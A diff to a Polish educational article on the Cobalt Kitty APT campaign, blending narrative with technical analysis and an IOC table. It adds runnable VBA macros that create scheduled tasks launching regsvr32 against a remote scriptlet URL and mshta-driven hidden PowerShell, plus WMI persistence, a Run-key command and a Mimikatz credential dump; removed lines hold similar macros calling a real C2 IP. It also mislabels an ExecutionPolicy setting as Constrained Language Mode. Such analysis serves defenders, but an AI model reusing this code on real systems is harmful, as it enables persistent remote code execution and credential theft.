@@ -1,6 +1,6 @@
-# Operacja Cobalt Kitty
+# Operacja Cobalt Kitty: Kompleksowa Analiza Techniczna z Warstwą Fabularną
 
-*W cichym mroku serwerowni globalnej korporacji, niewidzialny przeciwnik rozpoczął swoją misję. Był jak cień, przemieszczający się bezszelestnie między systemami, pozostając niezauważonym przez strażników cyfrowego świata. To była operacja Cobalt Kitty – mistrzowsko przeprowadzony atak, który miał zmienić zasady gry w cyberbezpieczeństwie.*
+*W cichym mroku serwerowni globalnej korporacji, niewidzialny przeciwnik rozpoczął swoją misję. Był jak cień, przemieszczający się bezszelestnie między systemami, pozostając niezauważonym przez strażników cyfrowego świata. To była Operacja Cobalt Kitty – mistrzowsko przeprowadzony atak, który miał zmienić zasady gry w cyberbezpieczeństwie.*
 
 ---
 
@@ -22,7 +22,8 @@
 7. [Środki Ochrony i Rekomendacje](#środki-ochrony-i-rekomendacje)
    - [7.1. Rola GPO](#71-rola-gpo)
 8. [Wnioski](#wnioski)
-9. [Bibliografia](#bibliografia)
+9. [Wskaźniki Kompromitacji (IOCs)](#wskaźniki-kompromitacji-iocs)
+10. [Bibliografia](#bibliografia)
 
 ---
 
@@ -40,7 +41,7 @@ Operacja Cobalt Kitty to skomplikowana kampania ataków skierowana na przedsięb
 
 - **Długotrwała obecność**: *Przez ponad pół roku atakujący przemieszczali się po systemach korporacji, zbierając cenne dane i pozostając niewykrytymi.*
 - **Unikanie wykrycia**: Wykorzystano zaawansowane techniki malware bezplikowego oraz funkcje systemu Windows.
-- **Precyzyjne działania**: *Atakujący niczym precyzyjny chirurg, systematycznie uzyskiwali dostęp do kluczowych segmentów infrastruktury.*
+- **Precyzyjne działania**: *Atakujący, niczym precyzyjny chirurg, systematycznie uzyskiwali dostęp do kluczowych segmentów infrastruktury.*
 
 ---
 
@@ -52,36 +53,61 @@ Operacja Cobalt Kitty to skomplikowana kampania ataków skierowana na przedsięb
 
    *Pierwszy krok był subtelny. Pracownicy otrzymali e-maile wyglądające jak standardowe komunikaty korporacyjne. W rzeczywistości były to starannie przygotowane wiadomości phishingowe, zawierające fałszywe instalatory Adobe Flash i dokumenty Word z złośliwymi makrami.*
 
-   - Atakujący wykorzystali socjotechnikę do nakłonienia pracowników do otwarcia zainfekowanych plików.
-   - Po uruchomieniu złośliwego kodu, malware rozpoczęło działanie w pamięci systemu.
+   - **Techniki:**
+     - **Phishing**: Atakujący wysyłali ukierunkowane e-maile z załącznikami lub linkami do fałszywych instalatorów Adobe Flash.
+     - **Makra w Wordzie**: Dokumenty zawierały złośliwe makra VBA, które uruchamiały się automatycznie po otwarciu pliku.
+
+   - **Powiązanie:**
+     - Makra uruchamiały skrypty PowerShell, które pobierały i uruchamiały złośliwy kod w pamięci.
+     - Umożliwiło to zainfekowanie wstępnych urządzeń bez wzbudzania podejrzeń.
 
 2. **Foothold i Persistencja**
 
    *Gdy drzwi zostały otwarte, intruz zaczął umacniać swoją pozycję. Tworzył ukryte ścieżki i zakamuflowane punkty dostępu, by zapewnić sobie stałą obecność.*
 
-   - Modyfikacje rejestru i tworzenie usług Windows.
-   - Ustanowienie zadań w harmonogramie zadań.
+   - **Techniki:**
+     - **Wpisy rejestru**: Dodawanie kluczy autostartu.
+     - **Tworzenie zadań w harmonogramie zadań**: Użycie `schtasks` i `CreateProcessA` do automatyzacji uruchamiania złośliwego kodu.
+     - **Subskrypcje WMI**: Uruchamianie skryptów przy określonych zdarzeniach systemowych.
+
+   - **Powiązanie:**
+     - Mechanizmy te zapewniły trwały dostęp do systemów, nawet po restartach.
 
 3. **Komunikacja C2 (Command and Control)**
 
    *Niewidzialne nitki komunikacji łączyły intruza z jego dowódcą. Każde polecenie, każde działanie było precyzyjnie kierowane z odległego centrum dowodzenia.*
 
-   - Wykorzystanie infrastruktury bezplikowej do komunikacji z serwerami C2.
-   - Maskowanie ruchu jako legalny ruch HTTP/HTTPS.
+   - **Techniki:**
+     - **DNS Tunneling**: Wykorzystanie zapytań DNS do przesyłania danych do serwerów C2 (`teriava.com`, `chatconnecting.com`).
+     - **Makra w Outlooku**: Modyfikacja `VbaProject.OTM` w celu wysyłania danych poprzez e-maile.
+     - **Bezplikowe payloady**: Wykorzystanie `Regsvr32` do uruchamiania kodu bez zapisu na dysku.
 
-4. **Rozpoznanie Wewnętrzne**
+   - **Powiązanie:**
+     - Umożliwiło to atakującym kontrolę nad zainfekowanymi maszynami i przesyłanie kolejnych etapów ataku.
+
+4. **Rozpoznanie Wewnętrzne i Ruch Boczy**
 
    *Atakujący przemierzał labirynty sieci korporacyjnej, mapując każdy zakamarek, szukając najbardziej wartościowych celów.*
 
-   - Skanowanie sieci i użytkowników.
-   - Identyfikacja cennych zasobów i dodatkowych kont.
+   - **Techniki:**
+     - **Skanowanie sieci**: Użycie PowerShell do mapowania infrastruktury.
+     - **Pozyskiwanie poświadczeń**: Wykorzystanie `Mimikatz` do zdobycia haseł.
+     - **Pass-the-Hash**: Uwierzytelnianie bez znajomości haseł w postaci jawnej.
+     - **WMI i PSExec**: Zdalne wykonywanie poleceń na innych maszynach.
 
-5. **Ruch Boczy (Lateral Movement)**
+   - **Powiązanie:**
+     - Pozwoliło to na eskalację uprawnień i dostęp do krytycznych systemów.
 
-   *Niczym duch, intruz przenosił się z jednego systemu na drugi, zdobywając coraz większą kontrolę nad infrastrukturą.*
+5. **Eksfiltracja Danych**
 
-   - Wykorzystanie technik Pass-the-Hash, WMI i dostępu do udziałów administracyjnych.
-   - Eskalacja uprawnień i zdobywanie dostępu do kolejnych systemów.
+   *Osiągnąwszy pełną kontrolę, intruz przystąpił do realizacji ostatecznego celu – wykradzenia cennych danych. Działał ostrożnie, by nie wzbudzić podejrzeń.*
+
+   - **Techniki:**
+     - **Makra w Outlooku**: Automatyczne wysyłanie zaszyfrowanych informacji.
+     - **Zmodyfikowane narzędzia sieciowe**: Użycie `NetCat` do przesyłania danych.
+
+   - **Powiązanie:**
+     - Eksfiltracja była końcowym etapem, realizowanym po zdobyciu pełnej kontroli.
 
 ---
 
@@ -91,8 +117,9 @@ Operacja Cobalt Kitty to skomplikowana kampania ataków skierowana na przedsięb
 
 *Złośliwe oprogramowanie działało jak widmo – bez śladu na dysku, tylko w ulotnej pamięci RAM.*
 
-- Wykorzystanie funkcji `VirtualAlloc` i `VirtualProtect` do alokacji i ochrony pamięci.
-- Uruchomienie złośliwego kodu bezpośrednio w pamięci.
+- **Wykorzystanie funkcji systemowych:**
+  - **`VirtualAlloc`** i **`VirtualProtect`**: Alokacja i zmiana atrybutów pamięci.
+  - **`CreateThread`**: Tworzenie nowych wątków do wykonania kodu.
 
 #### Przykład użycia:
 
@@ -112,6 +139,7 @@ WaitForSingleObject(hThread, INFINITE);
 
 - **PowerShell**: Pobieranie i uruchamianie złośliwych skryptów.
 - **WMI**: Zdalne wykonywanie kodu i utrzymanie persistencji.
+- **Regsvr32**: Wykorzystanie do uruchamiania złośliwego kodu z sieci.
 
 #### Przykład użycia PowerShell:
 
@@ -134,16 +162,16 @@ $Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -A
     Name = "PersistenceFilter";
     EventNamespace = "root\cimv2";
     QueryLanguage = "WQL";
-    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_OperatingSystem'"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
 }
 
 $Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
     Name = "PersistenceConsumer";
-    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\malicious\script.ps1"
+    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\malicious.ps1"
 }
 
 $Binding = Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
-    Filter = $Filter;
+    Filter   = $Filter;
     Consumer = $Consumer
 }
 ```
@@ -155,7 +183,7 @@ $Binding = Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsu
 #### Przykład dodania wpisu rejestru:
 
 ```cmd
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\malicious\script.ps1" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\malicious.ps1" /f
 ```
 
 ### 4.4. Ruch Boczy i Eskalacja Uprawnień
@@ -163,12 +191,12 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" 
 *Przemieszczając się między systemami, intruz zdobywał coraz większą władzę, niczym szachista przewidujący kilka ruchów naprzód.*
 
 - **Techniki ruchu bocznego**: Pass-the-Hash, WMI, PSExec.
-- **Narzędzia**: Mimikatz, PsExec.
+- **Narzędzia**: `Mimikatz`, `PsExec`.
 
 #### Przykład użycia Mimikatz:
 
 ```cmd
-.\mimikatz.exe "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
 ### 4.5. Unikanie Wykrycia
@@ -189,9 +217,9 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" 
 
 #### Wyjaśnienie kodu:
 
-- **Tworzenie polecenia `schtasks`**: Zdefiniowanie zadania w harmonogramie zadań.
-- **Użycie `CreateProcessA`**: Uruchomienie polecenia w nowym procesie.
-- **Usuwanie plików tymczasowych**: Eliminacja śladów.
+- **Tworzenie polecenia `schtasks`**: Definicja zadania, które będzie uruchamiane co 15 minut.
+- **Użycie `CreateProcessA`**: Uruchomienie polecenia w nowym procesie, co utrudnia wykrycie.
+- **Usuwanie plików tymczasowych**: Eliminacja śladów po wykonaniu zadania.
 
 #### Przykładowa implementacja VBA:
 
@@ -211,10 +239,26 @@ Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
     lpStartupInfo As STARTUPINFO, _
     lpProcessInformation As PROCESS_INFORMATION) As Long
 
-' Struktura STARTUPINFO i PROCESS_INFORMATION...
+' Struktury STARTUPINFO i PROCESS_INFORMATION
+' ...
 
 Sub CreateScheduledTaskWithCreateProcessA()
-    ' Kod tworzący zadanie harmonogramu z użyciem CreateProcessA
+    Dim sCMDLine As String
+    Dim si As STARTUPINFO
+    Dim pi As PROCESS_INFORMATION
+    Dim lSuccess As Long
+
+    ' Definicja polecenia CMD do utworzenia zadania
+    sCMDLine = "schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll"" /mo 15 /f"
+    
+    ' Inicjalizacja struktury STARTUPINFO
+    si.cb = Len(si)
+    
+    ' Uruchomienie polecenia za pomocą CreateProcessA
+    lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, 0, 0, vbNullString, si, pi)
+    
+    ' Zamykanie uchwytów procesu i wątku
+    ' ...
 End Sub
 ```
 
@@ -224,15 +268,51 @@ End Sub
 
 #### Wyjaśnienie kodu:
 
-- **Budowanie XML-a dla zadania**: Definiowanie parametrów zadania.
-- **Uruchomienie `schtasks` z XML-em**: Tworzenie zadania na podstawie pliku XML.
-- **Usuwanie pliku XML**: Ukrycie dowodów działalności.
+- **Budowanie XML-a dla zadania**: Definicja zadania harmonogramu w formacie XML, co ułatwia ukrycie złośliwych działań.
+- **Uruchomienie `schtasks` z XML-em**: Rejestracja zadania na podstawie przygotowanego pliku XML.
+- **Usuwanie pliku XML**: Usunięcie dowodów działalności po utworzeniu zadania.
 
 #### Pełna implementacja VBA:
 
 ```vba
 Sub CreateScheduledTaskXML()
-    ' Kod budujący XML i tworzący zadanie harmonogramu
+    Dim tstr As String
+    Dim fso As Object
+    Dim tempFile As String
+    Dim sCmd As String
+
+    ' Budowanie XML-a dla zadania
+    tstr = "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & vbCrLf
+    tstr = tstr & "  <Triggers>" & vbCrLf
+    tstr = tstr & "    <TimeTrigger>" & vbCrLf
+    tstr = tstr & "      <Repetition>" & vbCrLf
+    tstr = tstr & "        <Interval>PT15M</Interval>" & vbCrLf
+    tstr = tstr & "      </Repetition>" & vbCrLf
+    tstr = tstr & "      <StartBoundary>2024-01-01T00:00:00</StartBoundary>" & vbCrLf
+    tstr = tstr & "    </TimeTrigger>" & vbCrLf
+    tstr = tstr & "  </Triggers>" & vbCrLf
+    tstr = tstr & "  <Actions Context=""Author"">" & vbCrLf
+    tstr = tstr & "    <Exec>" & vbCrLf
+    tstr = tstr & "      <Command>mshta.exe</Command>" & vbCrLf
+    tstr = tstr & "      <Arguments>""vbscript:CreateObject(""Wscript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\malicious.ps1"",0:(window.close)""</Arguments>" & vbCrLf
+    tstr = tstr & "    </Exec>" & vbCrLf
+    tstr = tstr & "  </Actions>" & vbCrLf
+    tstr = tstr & "</Task>"
+
+    ' Zapisz XML jako plik tymczasowy
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    tempFile = Environ("TEMP") & "\ScheduledTask.xml"
+    With fso.CreateTextFile(tempFile, True)
+        .WriteLine tstr
+        .Close
+    End With
+
+    ' Wykonaj polecenie schtasks z wykorzystaniem pliku XML
+    sCmd = "schtasks /create /tn ""Power Efficiency Diagnostics XML"" /xml """ & tempFile & """ /f"
+    Shell sCmd, vbHide
+
+    ' Usuń plik XML po utworzeniu zadania
+    fso.DeleteFile tempFile, True
 End Sub
 ```
 
@@ -265,23 +345,26 @@ End Sub
 
 1. **Blokowanie nieautoryzowanego użycia PowerShell**
 
-   - Ustawienie trybu Constrained Language Mode.
-   - Konfiguracja zapisów zdalnych sesji.
+   - **Ustawienie trybu Constrained Language Mode**:
+     ```powershell
+     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -Name "ExecutionPolicy" -Value "Restricted"
+     ```
+   - **Konfiguracja zapisów zdalnych sesji PowerShell**.
 
 2. **Ograniczenia WMI**
 
-   - Ograniczenie dostępu tylko dla uprawnionych użytkowników.
-   - Monitorowanie aktywności.
+   - **Ograniczenie dostępu tylko dla uprawnionych użytkowników**.
+   - **Monitorowanie aktywności WMI**.
 
 3. **Audyt harmonogramu zadań**
 
-   - Włączenie szczegółowego logowania.
-   - Regularne przeglądanie zadań.
+   - **Włączenie szczegółowego logowania**.
+   - **Regularne przeglądanie zadań**.
 
 4. **Blokowanie znanych domen C2**
 
-   - Aktualizacja list blokowania.
-   - Blokowanie domen takich jak `teriava.com`, `chatconnecting.com`.
+   - **Aktualizacja list blokowania**.
+   - **Blokowanie domen**: `teriava.com`, `chatconnecting.com`.
 
 ---
 
@@ -299,34 +382,41 @@ End Sub
 
 ---
 
+## Wskaźniki Kompromitacji (IOCs)
+
+| **Etap**         | **Typ**              | **Wartość**                                            |
+|------------------|----------------------|--------------------------------------------------------|
+| Penetracja       | Domeny C2            | `teriava.com`, `chatconnecting.com`                    |
+| Penetracja       | Plik                 | `msfte.dll`                                            |
+| Utrzymanie       | Wpis Rejestru        | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`   |
+| Komunikacja C2   | Plik                 | `VbaProject.OTM` (zmodyfikowany w Outlooku)            |
+| Eksfiltracja     | Adresy IP            | `110.10.179.65`, `45.114.117.137`                      |
+| Ruch Boczy       | Narzędzie            | Wykorzystanie `Mimikatz` do pozyskiwania poświadczeń   |
+| Utrzymanie       | Zadanie Harmonogramu | `Power Efficiency Diagnostics`, `MyTask`               |
+| Eksfiltracja     | Proces               | Niekonwencjonalne użycie `Regsvr32.exe`                |
+
+---
+
 ## Bibliografia
 
 1. **Cybereason Labs**: *Operation Cobalt Kitty - Technical Analysis*.
-
-   - [Link do raportu](https://www.cybereason.com/operation-cobalt-kitty-apt)
+   - [Link do raportu](https://www.cybereason.com/blog/operation-cobalt-kitty-apt)
 
 2. **Microsoft Developer Network (MSDN)**:
-
    - [VirtualAlloc Function](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
-
-   - [CreateThread Function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
+   - [CreateProcessA Function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
 
 3. **MITRE ATT&CK Framework**:
-
    - [Fileless Malware Techniques](https://attack.mitre.org/techniques/T1059/001/)
+   - [APT32 Group Description](https://attack.mitre.org/groups/G0050/)
 
 4. **CVE Details**:
-
    - [CVE-2017-8759](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8759)
-
    - [CVE-2018-8174](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8174)
-
    - [CVE-2020-0601](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0601)
 
 5. **Publikacje z zakresu cyberbezpieczeństwa**:
-
    - FireEye: *APT32 and the Threat Landscape in Southeast Asia*
-
    - Kaspersky Lab: *OceanLotus and the Rise of APT Attacks in Asia*
 
 ---
@@ -334,162 +424,3 @@ End Sub
 *Ostrzeżenie*: Analiza złośliwego oprogramowania powinna być przeprowadzana wyłącznie przez wykwalifikowanych specjalistów w kontrolowanym środowisku. Prezentowany kod i techniki mają charakter edukacyjny i nie powinny być wykorzystywane do celów niezgodnych z prawem lub etyką. Celem tego artykułu jest edukacja i poprawa bezpieczeństwa systemów informatycznych.
 
 ---
-
-### Rozszerzona analiza kodów makr użytych w Operacji Cobalt Kitty
-
-Poniżej przedstawiam dokładny opis dwóch fragmentów kodów VBA (Visual Basic for Applications), które były wykorzystywane w Operacji Cobalt Kitty do utrzymania obecności malware i wykonania złośliwych skryptów.
-
----
-
-### **Kod 1: Tworzenie zaplanowanego zadania za pomocą CreateProcessA**
-
-```vba
-Option Explicit
-
-' Deklaracja funkcji CreateProcessA z WinAPI
-Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
-    ByVal lpApplicationName As String, _
-    ByVal lpCommandLine As String, _
-    ByVal lpProcessAttributes As LongPtr, _
-    ByVal lpThreadAttributes As LongPtr, _
-    ByVal bInheritHandles As Long, _
-    ByVal dwCreationFlags As Long, _
-    ByVal lpEnvironment As LongPtr, _
-    ByVal lpCurrentDirectory As String, _
-    lpStartupInfo As STARTUPINFO, _
-    lpProcessInformation As PROCESS_INFORMATION) As Long
-
-' Struktura STARTUPINFO
-Private Type STARTUPINFO
-    cb As Long
-    lpReserved As LongPtr
-    lpDesktop As LongPtr
-    lpTitle As LongPtr
-    dwX As Long
-    dwY As Long
-    dwXSize As Long
-    dwYSize As Long
-    dwXCountChars As Long
-    dwYCountChars As Long
-    dwFillAttribute As Long
-    dwFlags As Long
-    wShowWindow As Integer
-    cbReserved2 As Integer
-    lpReserved2 As LongPtr
-    hStdInput As LongPtr
-    hStdOutput As LongPtr
-    hStdError As LongPtr
-End Type
-
-' Struktura PROCESS_INFORMATION
-Private Type PROCESS_INFORMATION
-    hProcess As LongPtr
-    hThread As LongPtr
-    dwProcessId As Long
-    dwThreadId As Long
-End Type
-
-' Funkcja do zamykania uchwytu procesu
-Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
-
-Sub CreateScheduledTaskWithCreateProcessA()
-    Dim sCMDLine As String
-    Dim si As STARTUPINFO
-    Dim pi As PROCESS_INFORMATION
-    Dim lSuccess As Long
-
-    ' Definicja polecenia CMD do utworzenia zadania
-    sCMDLine = "schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""regsvr32.exe /s /n /u /i:http://110.10.179.65:80/download/microsoftv.jpg scrobj.dll"" /mo 15 /f"
-    
-    ' Inicjalizacja struktury STARTUPINFO
-    si.cb = Len(si)
-    
-    ' Uruchomienie polecenia za pomocą CreateProcessA
-    lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, NORMAL_PRIORITY_CLASS, 0, vbNullString, si, pi)
-    
-    ' Sprawdzenie wyniku
-    If lSuccess = 0 Then
-        MsgBox "Nie udało się utworzyć zadania", vbCritical
-    Else
-        MsgBox "Zadanie zostało utworzone pomyślnie", vbInformation
-    End If
-
-    ' Zamykanie uchwytów procesu i wątku
-    If pi.hProcess <> 0 Then CloseHandle pi.hProcess
-    If pi.hThread <> 0 Then CloseHandle pi.hThread
-End Sub
-```
-
-#### **Opis działania:**
-1. **CreateProcessA**: Funkcja z WinAPI, która umożliwia uruchomienie dowolnego procesu lub aplikacji.
-2. **Zadanie harmonogramu**:
-   - Utworzony harmonogram wykorzystuje `schtasks`, aby uruchamiać `regsvr32.exe` z złośliwym URL-em (`microsoftv.jpg`), który inicjuje łańcuch infekcji.
-   - `regsvr32.exe` to legalne narzędzie systemowe używane do ładowania bibliotek DLL. W tym przypadku ładuje złośliwy obiekt COM.
-
----
-
-### **Kod 2: Tworzenie zaplanowanego zadania z XML-em**
-
-```vba
-Sub CreateScheduledTaskXML()
-    Dim tstr As String
-    Dim XMLStr As String
-
-    ' Budowanie XML-a dla zadania
-    tstr = "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & vbCrLf
-    tstr = tstr & "  <Triggers>" & vbCrLf
-    tstr = tstr & "    <TimeTrigger>" & vbCrLf
-    tstr = tstr & "      <Repetition>" & vbCrLf
-    tstr = tstr & "        <Interval>PT15M</Interval>" & vbCrLf
-    tstr = tstr & "      </Repetition>" & vbCrLf
-    tstr = tstr & "      <StartBoundary>2024-01-01T00:00:00</StartBoundary>" & vbCrLf
-    tstr = tstr & "    </TimeTrigger>" & vbCrLf
-    tstr = tstr & "  </Triggers>" & vbCrLf
-    tstr = tstr & "  <Actions Context=""Author"">" & vbCrLf
-    tstr = tstr & "    <Exec>" & vbCrLf
-    tstr = tstr & "      <Command>mshta.exe</Command>" & vbCrLf
-    tstr = tstr & "      <Arguments>about:""<script language=""vbscript"">" & vbCrLf
-    tstr = tstr & "      src=""http://110.10.179.65:80/download/microsoftfp.jpg"";code close</script>""</Arguments>" & vbCrLf
-    tstr = tstr & "    </Exec>" & vbCrLf
-    tstr = tstr & "  </Actions>" & vbCrLf
-    tstr = tstr & "</Task>"
-
-    ' Zapisz XML jako plik tymczasowy
-    Dim fso As Object
-    Dim tempFile As String
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    tempFile = Environ("TEMP") & "\ScheduledTask.xml"
-    Dim file As Object
-    Set file = fso.CreateTextFile(tempFile, True)
-    file.WriteLine tstr
-    file.Close
-
-    ' Wykonaj polecenie schtasks z wykorzystaniem pliku XML
-    Dim sCmd As String
-    sCmd = "schtasks /create /tn ""Power Efficiency Diagnostics XML"" /xml """ & tempFile & """ /f"
-    Shell sCmd, vbNormalFocus
-
-    ' Usuń plik XML po utworzeniu zadania
-    fso.DeleteFile tempFile, True
-
-    MsgBox "Zadanie zostało utworzone pomyślnie przy użyciu XML", vbInformation
-End Sub
-```
-
-#### **Opis działania:**
-1. **Generowanie XML**:
-   - Kod buduje XML zawierający polecenie `mshta.exe`, które uruchamia kod VBScript osadzony w zewnętrznym źródle.
-2. **mshta.exe**:
-   - Narzędzie systemowe używane do uruchamiania aplikacji HTML i skryptów. W tym przypadku wykorzystywane jako mechanizm do zdalnego uruchamiania kodu.
-3. **Zadanie harmonogramu**:
-   - XML rejestruje zadanie systemowe wywołujące `mshta.exe` co 15 minut.
-
----
-
-### **Podsumowanie działania kodów VBA**
-
-Oba powyższe fragmenty kodu pokazują różne techniki używane przez atakujących:
-- **Pierwszy kod** wykorzystuje `CreateProcessA` do bezpośredniego tworzenia zadania harmonogramu z payloadem w `regsvr32.exe`.
-- **Drugi kod** stosuje bardziej złożone podejście z wykorzystaniem XML i `mshta.exe`, co ułatwia ukrywanie działań złośliwego oprogramowania.
-
-Kody te podkreślają wagę monitorowania harmonogramów zadań i aktywności procesów systemowych w celu wykrywania nieautoryzowanych działań.
